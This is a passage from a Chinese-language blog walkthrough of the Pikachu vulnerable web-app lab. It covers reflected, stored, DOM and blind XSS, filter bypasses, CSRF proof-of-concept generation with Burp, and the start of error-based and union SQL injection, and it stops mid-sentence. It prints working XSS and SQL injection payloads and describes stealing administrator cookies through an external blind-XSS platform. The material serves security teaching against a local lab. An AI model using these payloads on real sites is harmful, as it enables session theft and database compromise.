xss payload，由于是 Get 的请求方式并且文本框设置了<code>maxlength</code>(文本最大长度限制)，所以我们可以在 URL 中直接插入 xss payload 触发漏洞，以下 payload 均可触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br><span class="line">&lt;details+open+ontoggle=prompt(1)&gt;</span><br><span class="line">&lt;svg/onload=confirm(1)&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/49a9c0da012ee5cc83809ee5112ed366.png"></p><p>查看前端代码，xss payload 被插入到了 p 标签当中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a5633c5bb00e03b94b5d5079f526a384.png"></p><h3 id="反射性-xss-post"><a href="#反射性-xss-post" class="headerlink" title="反射性 xss(post)"></a>反射性 xss(post)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/39d4d010d60b3946df56c96f898cadd8.png"></p><p>本关需要先输入账号密码登陆</p><p>用户名<code>admin</code> 密码 <code>123456</code></p><p>登录成功后在文本框中输入 123 点击 submit，页面仍会将 123 显示到前端页面中，只是请求方式变成了 POST</p><p><img src="https://img-blog.csdnimg.cn/img_convert/20833f67f37c9cb9c5c62d960e8a440f.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/01f907e1ff57408bf9fe470f205cfd35.png"></p><p>接下来开启 burp 抓包，然后输入 123 点击 submit，然后将请求包的 message 修改为 xss 的 payload 并放包</p><p><img src="https://img-blog.csdnimg.cn/img_convert/94f096963a53218ab8d96caeccf5f0e0.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a6009aec4fd3474b3efea584b5f8c6b.png"></p><p>查看前端代码，xss payload 被插入 p 标签中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b473db64da129cd0d45fcbf6ae5d634e.png"></p><h3 id="存储型-xss"><a href="#存储型-xss" class="headerlink" title="存储型 xss"></a>存储型 xss</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/ba75d13fc47dfe34c3c072025ccd286d.png"></p><p>存储型 xss 顾名思义也就是我们输入的内容会被存储到数据库中，当用户访问时页面会将数据库的查询结果显示到页面上</p><p>同样的本关可以直接在多行文本框中输入 xss payload 点击 submit 提交即可触发 xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/οnlοad=confirm(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/44905491d6015093394d2d23c1990207.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/07b4336d46f7015de9ae94f55972022b.png"></p><h3 id="DOM-型-xss"><a href="#DOM-型-xss" class="headerlink" title="DOM 型 xss"></a>DOM 型 xss</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/ea51cc6dffd0ed03d3e18511e8b1e700.png"></p><p>DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情，无法通过 WAF 防护。</p><p>js 中，从 url 中获得参数并将其作为 js 执行，就有可能导致 DOM XSS</p><p>本关我们输入 123 后，点击 click me 下面显示出来 what do you see?，我们查看前端代码发现 123 直接赋值给了 a 标签的 href，这就导致了 xss 漏洞产生</p><p><img src="https://img-blog.csdnimg.cn/img_convert/14002c44640f73e428f051d84bda3d58.png"></p><p>此时我们可以直接使用以下 payload 触发 xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/fff83beb0bb75045707562563b235ceb.png"></p><p>提交之后鼠标点击 a 链接即可触发 xss</p><p><img src="https://img-blog.csdnimg.cn/img_convert/aaef8cbeca14b499a96bfa0fa2204eb2.png"></p><h3 id="DOM-型-xss-x"><a href="#DOM-型-xss-x" class="headerlink" title="DOM 型 xss-x"></a>DOM 型 xss-x</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/83d7454d51b4d8fb72bc7d9b88c3d57e.png"></p><p>本关使用的 payload 与上一关相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0f9b3c7d7b324dd348a2883d5c869fb4.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/36383fb287e72e97c423932edc8829c7.png"></p><p>查看前端代码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/52517f1c52657c6f478b150b97ccda56.png"></p><h3 id="xss-之盲打"><a href="#xss-之盲打" class="headerlink" title="xss 之盲打"></a>xss 之盲打</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7341e8d26ac2fab9fa3c207027f8daa5.png"></p><p>XSS 盲打不是一种漏洞类型而是一种 xss 漏洞的利用方式，攻击者可以在网站留言板、反馈建议等功能点提交恶意的 xss payload，如果该网站存在 xss 漏洞，当管理员在后台查看用户留言页面时就会执行 xss payload，xss 盲打最主要的目的是通过加载外部的恶意 js 文件 (通过 xss 盲打平台生成) 获取管理员后台的 Cookie 信息，攻击者就可以使用管理员的身份访问网站后台从而进一步发动攻击</p><p>首先将 xss payload 填入文本框并提交</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e899ed6e7d0aad3ee69fac048e3e97db.png"></p><p>点击右上角的提示信息，获取到管理后台的地址<code>/vul/xss/xssblind/admin_login.php</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/474fb764cde588f1bd7926268f73ad59.png"></p><p>输入账号密码进行登录 <code>admin 123456</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1b3d87af14866ac3591988286bdd6290.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/f6fffcb5a3ff1630f298a28d3be2e68a.png"></p><p>查看前端代码，刚刚提交的 xss payload 被插入到 td 标签中执行了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/57bbec8cba8e82f2c6341858206115c7.png"></p><p>接下来演示下使用 xss 盲打平台生成恶意的 js 进行远程加载获取管理员的 cookie 信息</p><blockquote><p>本次使用的 xss 盲打平台：<a href="http://xsscom.com/" title="http://xsscom.com/">http://xsscom.com/</a></p></blockquote><p>注册好账号后 点击创建项目，输入任意项目名称点击下一步</p><p><img src="https://img-blog.csdnimg.cn/img_convert/17594d45c4e2d4cd2c578714bfea7cc9.png"></p><p>根据实际情况进行勾选即可，这里我勾选默认模块、xss.js，然后点击下一步</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c98d41795924f8b0b89c0f40bba170e9.png"></p><p>在项目代码中可以复制下方的 payload 直接插入使用</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2c52d95e38e456f45e3ae422614a463.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/34c3528d22521e6878f8081387f99491.png"></p><p>提交之后我们再去以管理员身份去访问下用户反馈的意见列表</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d51088fc51fc39503538fdd9087f832c.png"></p><p>查看此处的前端代码，可以看到 xss 盲打平台的 js 文件已经被加载了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c484532841f32b47713156b213a12ed8.png"></p><p>现在我们可以回到 xss 盲打平台查看接收到的信息，可以看到已经获取到了后台的 URL 和用户的 Cookie 等信息，此时攻击者就可以直接替换 Cookie 信息去访问管理后台了，这就是完整的 xss 盲打的利用流程</p><p><img src="https://img-blog.csdnimg.cn/img_convert/769ac2e1bde5db2af84a2bb372b6407a.png"></p><h3 id="xss-之过滤"><a href="#xss-之过滤" class="headerlink" title="xss 之过滤"></a>xss 之过滤</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/14aedb90c5de48cd06e25361bfb8fa48.png"></p><p>本关已经明确有过滤存在了，现在我来直接来黑盒测试下它的过滤规则是怎样的</p><p>首先输入<code>&lt;&gt;</code>发现可以正常打印出来，没有被过滤</p><p><img src="https://img-blog.csdnimg.cn/img_convert/660854c8b4e1dd96b4b9541484f5e808.png"></p><p>然后输入<code>&lt;script&gt;</code>再次提交，发现只剩下了右括号，其余内容都被过滤掉了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ad825a41fe1aaa1a8549f23c79c2255c.png"></p><p>判断对<code>&lt;script</code>进行匹配如果发现存在则直接变为空</p><p>此时我们可以尝试使用双写关键词的方式进行绕过<code>&lt;scrscriptipt&gt;</code>发现无法绕过</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d16a041fc2969eedd025581ff0e86512.png"></p><p>再尝试使用关键词大小写的方式进行绕过<code>&lt;ScRiPt&gt;</code>，发现插入成功，也就是绕过了它的过滤机制</p><p><img src="https://img-blog.csdnimg.cn/img_convert/983503e04f8bfa473f66caa11e66dd39.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e8851e32aa607bd79668b8735d0e0d0b.png"></p><p>接下来就编写 xss payload <code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>，提交之后即可触发</p><p><img src="https://img-blog.csdnimg.cn/img_convert/717c1ffed6859c1dfd8fae341c53d7aa.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2b904d717fcbc4845aba01af84c60a3.png"></p><h3 id="xss-之-htmlspecialchars"><a href="#xss-之-htmlspecialchars" class="headerlink" title="xss 之 htmlspecialchars"></a>xss 之 htmlspecialchars</h3><p>htmlspecialchars() 函数把一些预定义的<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913?fromModule=lemma_inlink" title="字符">字符</a>转换为 HTML 实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">预定义的字符是：</span><br><span class="line">&amp;（和号） 成为&amp;</span><br><span class="line">&quot; （双引号） 成为 &quot;</span><br><span class="line">&#x27; （单引号） 成为 &#x27;</span><br><span class="line">&lt; （小于） 成为 &lt;</span><br><span class="line">&gt; （大于） 成为 &gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars 默认不对<code>&#39;</code>进行处理，所以此处我们的 payload 可以设置为<code>123&#39; onclick=&#39;alert(1)&#39;</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7593655e232b4014f792a8fbd66fab1c.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c094c7853f31cc0e97466041245a5e80.png"></p><h3 id="xss-之-href-输出"><a href="#xss-之-href-输出" class="headerlink" title="xss 之 href 输出"></a>xss 之 href 输出</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/85c325ff4a04332b9c9ca89d61c71044.png"></p><p>本关可以直接使用<code>javascript:alert(1)</code>进行触发，payload 被加载到 a 标签的 href 属性中，点击即可触发</p><p><img src="https://img-blog.csdnimg.cn/img_convert/54bfcac9030c93b7eb5ea6a03898af2a.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/2619ecbe9a82ee3790f7bb675b872d22.png"></p><h3 id="xss-之-js-输出"><a href="#xss-之-js-输出" class="headerlink" title="xss 之 js 输出"></a>xss 之 js 输出</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/923a2d61cfd49efbdfaaaa758198009d.png"></p><p>根据提示信息输入 tmac 即可加载出相关球星的照片</p><p><img src="https://img-blog.csdnimg.cn/img_convert/782694272ea1174218713bcd2860184c.png"></p><p>接下来查看网页源代码，发现是通过 $ms 传递参数，我们可以尝试进行闭合并触发 xss</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f1d3606b68ca750464454c8660fb85e8.png"></p><p>输入 payload<code>tmac&#39;;alert(1);//</code>即可触发</p><p><img src="https://img-blog.csdnimg.cn/img_convert/195df1dd271b7ac1c11dc29fd0ef5c7b.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c177b370c3809545869718b757843c38.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(跨站请求伪造) 概述</p><p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 “one click” 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆, 更有甚者会将其和越权问题混为一谈, 这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。<strong>场景需求：</strong> 小黑想要修改大白在购物网站 tianxie<a href="http://www.xx.com/">www.xx.com</a> 上填写的会员地址。<strong>先看下大白是如何修改自己的密码的：</strong> 登录—修改会员信息，提交请求—修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p><p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到 <a href="http://www.xx.com/">www.xx.com</a> 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：【<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change%E3%80%91" title="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】">http:&#x2F;&#x2F;www.xxx.com&#x2F;edit.php?email&#x3D;xiaohei@88.com&Change=Change】</a>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了, 小黑就完成了攻击目的。</p><p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong> 1.<a href=";---%E5%9B%A0%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E5%88%A4%E6%96%AD%E5%85%B6%E5%AF%B9%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%EF%BC%88%E6%AF%94%E5%A6%82%E5%AF%86%E7%A0%81%E7%AD%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%89%E7%9A%84%E6%93%8D%E4%BD%9C(%E5%A2%9E%E5%88%A0%E6%94%B9)%E6%98%AF%E5%90%A6%E5%AE%B9%E6%98%93%E8%A2%AB%E4%BC%AA%E9%80%A0%E3%80%822.%E5%B0%8F%E7%99%BD%E7%82%B9%E5%87%BB%E4%BA%86%E5%B0%8F%E9%BB%91%E5%8F%91%E7%BB%99%E7%9A%84%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%B0%8F%E7%99%BD%E5%88%9A%E5%A5%BD%E7%99%BB%E5%BD%95%E5%9C%A8%E8%B4%AD%E7%89%A9%E7%BD%91%E4%B8%8A;---%E5%A6%82%E6%9E%9C%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E9%AB%98%EF%BC%8C%E4%B8%8D%E7%82%B9%E5%87%BB%E4%B8%8D%E6%98%8E%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%88%99%E6%94%BB%E5%87%BB%E4%B8%8D%E4%BC%9A%E6%88%90%E5%8A%9F%EF%BC%8C%E5%8F%88%E6%88%96%E8%80%85%E5%8D%B3%E4%BD%BF%E5%B0%8F%E7%99%BD%E7%82%B9%E5%87%BB%E4%BA%86%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%BD%86%E5%B0%8F%E7%99%BD%E6%AD%A4%E6%97%B6%E5%B9%B6%E6%B2%A1%E6%9C%89%E7%99%BB%E5%BD%95%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%EF%BC%8C%E4%B9%9F%E4%B8%8D%E4%BC%9A%E6%88%90%E5%8A%9F%E3%80%82---%E5%9B%A0%E6%AD%A4%EF%BC%8C%E8%A6%81%E6%88%90%E5%8A%9F%E5%AE%9E%E6%96%BD%E4%B8%80%E6%AC%A1CSRF%E6%94%BB%E5%87%BB%EF%BC%8C%E9%9C%80%E8%A6%81%E2%80%9C%E5%A4%A9%E6%97%B6%EF%BC%8C%E5%9C%B0%E5%88%A9%EF%BC%8C%E4%BA%BA%E5%92%8C%E2%80%9D%E7%9A%84%E6%9D%A1%E4%BB%B6%E3%80%82%E5%BD%93%E7%84%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%B0%8F%E9%BB%91%E4%BA%8B%E5%85%88%E5%9C%A8xxx%E7%BD%91%E7%9A%84%E9%A6%96%E9%A1%B5%E5%A6%82%E6%9E%9C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AAXSS%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%88%99%E5%B0%8F%E9%BB%91%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%BF%99%E6%A0%B7%E5%81%9A%EF%BC%9A">www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;—因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。—因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做：</a> 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。—所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p><p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>–对敏感信息的操作增加安全的 token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p><p>如果你没有读太明白, 不要犹豫, 请再读一遍啦</p><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2c6dd9e368eec60fb62ace096c70cdf2.png"></p><p>提示：这里一共有这么些用户 vince&#x2F;allen&#x2F;kobe&#x2F;grady&#x2F;kevin&#x2F;lucy&#x2F;lili, 密码全部是 123456</p><p>这里我们使用 vince 登录后，页面显示了用户的个人信息，下方有一个修改个人信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b887fe1a358f2806571d007cb2ced988.png"></p><p>点击之后打开了修改个人信息页面，我们将手机号修改为<code>18888888888</code>，开启 burp 抓包并点击 submit 按钮</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9dd19ba6682bbd4b4ad011421735190d.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0284f8b7c6758507cc1e0a5ad62af12e.png"></p><p>此时我们使用 burp 直接生成 CSRF Poc 代码，右键请求包 → Engagement tools → Generate CSRF PoC</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1058dbcd54dcb7a0442ab5139554718f.png"></p><p>点击 Test in browser</p><p><img src="https://img-blog.csdnimg.cn/img_convert/373dd1c30d7d5e7c982b68bd9e568b95.png"></p><p>复制弹出的 URL 链接，在浏览器中打开</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a851525be98ab1495997411dd77a847.png"></p><p>现在先不要点击 Submit request 按钮</p><p><img src="https://img-blog.csdnimg.cn/img_convert/59ef15814e4355b82aaa3252fa6e977c.png"></p><p>然后将当前请求包 Drop 掉，关闭 burp 拦截</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8b27214970c849a8c169dc917720e70f.png"></p><p>重新访问漏洞页面，由于我们刚才 drop 掉了请求包，所以现在的手机号与刚才是相同的没有被修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/csrf/csrfget/csrf_get_edit.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ecdfebf2b22592511c2d441897c2e33c.png"></p><p>现在我们去点击 burp 生成的 CSRF Poc 页面中的 submit 按钮</p><p><img src="https://img-blog.csdnimg.cn/img_convert/01b8e5914edf24541f54827193882d10.png"></p><p>点击之后页面跳转至个人信息页面，并且手机号已经发生了改变，正常情况下这个 CSRF Poc 的页面是攻击者生成的，然后发送给受害者进行点击，然后攻击者就可以使用受害者的合法的身份去访问网站 (比如修改密码、修改个人信息等)。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/68e551416a14f6ff706dfb89117372aa.png"></p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/758b875d65dab26310c2b922a0596a61.png"></p><p>本关的漏洞利用方式与上一关相同，只是请求方式发生了改变，此处不再赘述</p><p><img src="https://img-blog.csdnimg.cn/img_convert/92944d66c5163bfae86ab7b53548f9c7.png"></p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9506ba47b405dc3e8cb204881e85b5e4.png"></p><p>修改个人信息时发现会携带 token 一起发送，并且会在当前页面的前端代码中生成新的 token 值</p><p><img src="https://img-blog.csdnimg.cn/img_convert/43db67145a422dcad081f74a62e480e5.png"></p><p>构造一般的 PoC 肯定不行，本关需要使用 burp 的插件 CSRF Token Tracker，在 Extender 里面下载：</p><blockquote><p>CSRF Token Tracker 可以自动获取 csrf 的 token，对于一些有 csrf 限制的请求，它可以绕过该限制，如暴力破解具有 csrf token 的登录请求，在渗透测试过程中 CSRF Token 的自动更新。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d772b3edce89ad11e6975d0b9c2ee63f.png"></p><p>这里代表 token 的变量名字就叫 token，在插件中添加一条规则：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2765369e0b0a7ee805df0cf834581fc5.png"></p><p>将上文的数据包发送到 Repeater，将手机号修改为 13333333333 发送数据包，查看能否修改</p><p>发送请求包后页面出现重定向按钮，我们点击 follow 跟随跳转</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d032fcfb16044128301626e086815bdc.png"></p><p>此时响应包中的手机号已经修改成功了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f36604b91b7285dff96e8d4baff7fb59.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/deb699cacac346ea88c160b3af31c63d.png"></p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><p>在 owasp 发布的 top10 排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<strong>一个严重的 SQL 注入漏洞，可能会直接导致一家公司破产！</strong> SQL 注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的 “数据” 拼接到 SQL 语句中后，被当作 SQL 语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来防止 SQL 注入漏洞：  </p><ol><li>对传进 SQL 语句里面的变量进行过滤，不允许危险字符传入；  </li><li>使用参数化（Parameterized Query 或 Parameterized Statement）；  </li><li>还有就是, 目前有很多 ORM 框架会自动使用参数化解决注入问题, 但其也提供了 “拼接” 的方式, 所以使用时需要慎重!</li></ol><blockquote><p>本章节不再详细描述 SQL 注入的过程，如果想深入学习 sql 注入漏洞，可以参考 sqli-labs 的那篇文章</p></blockquote><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><strong>抓包分析：</strong> 在这个查询中，”id&#x3D;4 or 1&#x3D;1” 是一个逻辑表达式，用于作为查询条件来筛选 “table1” 表中的记录。<br>逻辑运算符 “or” 表示逻辑或（OR），它表示只要两个条件中的任何一个为真，整个表达式就为真。在这种情况下，”id&#x3D;4” 和 “1&#x3D;1” 是两个条件，其中 “1&#x3D;1” 始终为真，因为它是一个卫语（tautology），表示任何值都等于自己。<br>所以，这个查询会返回 “table1” 表中所有记录，&#x3D;&#x3D;因为 “1&#x3D;1” 作为一个始终为真的条件，将使整个表达式为真，从而不会对 “id&#x3D;4” 这个条件产生实际的筛选作用。&#x3D;&#x3D;这样的查询通常在测试或调试时使用，但在生产环境中，应该使用具有实际业务意义的条件来过滤数据，以满足实际需求。<br><img src="/images/Pasted%20image%2020230410184431.png"><br>全部都select出来，id&#x3D;4因为1&#x3D;1失效。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7518992ffda9ce2533cb4ad86ded32ed.png"></p><p>使用 burp 开启抓包，选择 1 点击查询按钮，响应包中出现了 mysql 报错信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1bdde886cef47fa2787a32a5b94b16e8.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6e0f98188fbc75fcda33544810ebd1fe.png"></p><p>直接使用报错注入的 payload 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=1 正常显示</span><br><span class="line">id=1&#x27; 提示mysql报错</span><br><span class="line">id=1 and 1=1 页面显示正常</span><br><span class="line">id=1 and 1=2 页面显示错误</span><br><span class="line">判断为mysql数据库的数字型注入点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用以下payload获取数据库名称：</span><br><span class="line">1+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)+--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/355f0c94cea6ec1993c2763846fde064.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5bd9b10b3e90491f2aa64202ee10a314.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b96cfc18aba23c867d48f00626ad7c84.png"></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>这是一种可能用于尝试进行 SQL 注入的语句。在这个语句中，通过在查询条件中添加 <code>&#39; or 1=1 #</code>，试图让查询条件永远为真，从而绕过原本的身份验证或查询限制，获取更多的数据。<br>具体解释如下：</p><ul><li><code>&#39;</code> 是 SQL 中的字符串引号，用于表示字符串值的开始或结束。</li><li><code>or</code> 是 SQL 中的逻辑运算符，表示逻辑或关系，只要其中一个条件为真，整个条件就为真。</li><li><code>1=1</code> 是一个始终为真的条件，因为 1 等于 1。</li><li><code>#</code> &#x3D;&#x3D;是 SQL 中的注释符号，表示后面的内容为注释，不会被执行。&#x3D;&#x3D;</li><li>整个语句的作用是尝试在查询条件中添加一个始终为真的条件，使得整个查询条件永远为真，从而绕过原本的查询限制。<br><img src="/images/Pasted%20image%2020230410191057.png"></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/e29f434845ef2905f70ffcf5746bf9a3.png"></p><p>本关也是同样的 首先判断是字符型还是数字型，然后获取数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name=123 页面显示正常</span><br><span class="line">name=123&#x27; mysql报错提示</span><br><span class="line">name=123&#x27;&#x27; 页面显示正常，判断为字符型注入</span><br><span class="line">name=123&#x27; order by 3 --+ 判断查询字段有2列</span><br><span class="line">name=123&#x27; union select 1,2 --+ 页面显示结果uid为1，email为2</span><br><span class="line">name=123&#x27; union select database(),version() --+ 使用union联合注入获取数据库名和数据库版本信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6439ac56f7ba1a31c27368818ad51692.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6b340563a9a6e351d37fe3cba81eff46.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d98a6e38960f4a35b43696b5c9b6ca24.png"></p><p>页面显示结果 uid 为 1，email 为 2</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fcefcdffcf6d495514856ef6b2b8a6a9.png"></p><p>使用 union 联合注入获取数据库名和数据库版本信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5dab04c05dc1d12312a2559b04401336.png"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>闭合符号为<code>%&#39;</code>, 注入 payload: <code>g%&#39; union select database(),2,3#</code>  </p><ol><li>“SELECT * FROM 表名”：这是一个普通的 SQL 查询语句，用于从名为 “表名” 的表中选择所有的列和记录。</li><li>“WHERE g%’”：这是一个 SQL 注入的攻击向量，其中通过在查询条件中使用 ‘ 符号来尝试绕过数据库的输入验证。在这里，g% 是一个用于构造恶意注入查询的字符串，’ 符号的作用是闭合 SQL 